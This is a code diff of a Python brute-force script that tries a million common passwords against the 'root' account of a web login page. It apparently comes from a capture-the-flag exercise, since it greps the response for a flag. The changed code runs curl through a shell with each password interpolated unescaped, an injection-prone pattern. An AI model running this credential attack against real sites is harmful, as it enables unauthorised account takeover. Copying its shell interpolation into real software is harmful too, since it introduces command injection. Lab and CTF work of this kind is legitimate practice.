@@ -1,4 +1,4 @@
-import requests, sys
+import requests, sys, subprocess
 
 password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
 username = "root"
@@ -6,6 +6,18 @@ username = "root"
 def get_password_list(url):
 	response = requests.get(url)
 	return response.text.splitlines()
+
+def run_curl_command(ip, password):
+	curl_command = f'curl -s "http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#"'
+	grep_command = "grep flag | awk -F': | <' '{print \"\\nThe flag is: \"$2}'"
+	
+	full_command = f"{curl_command} | {grep_command}"
+	
+	try:
+		result = subprocess.check_output(full_command, shell=True, stderr=subprocess.PIPE)
+		return result.decode().strip()
+	except subprocess.CalledProcessError:
+		return None
 
 def bruteforce(ip):
 	try:
@@ -19,13 +31,12 @@ def bruteforce(ip):
 	for password in password_list:
 		password = password.strip()
 		
-		response = requests.post(f"http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#")
+		flag = run_curl_command(ip, password)
 		
-		if "flag" in response.text:
+		if flag:
 			print(f"Success! Username: {username} Password: {password}")
+			print(flag)
 			return True
-		else:
-			print(f"Failed attempt with password: {password}")
 	
 	print("Password not found in the list.")
 	return False
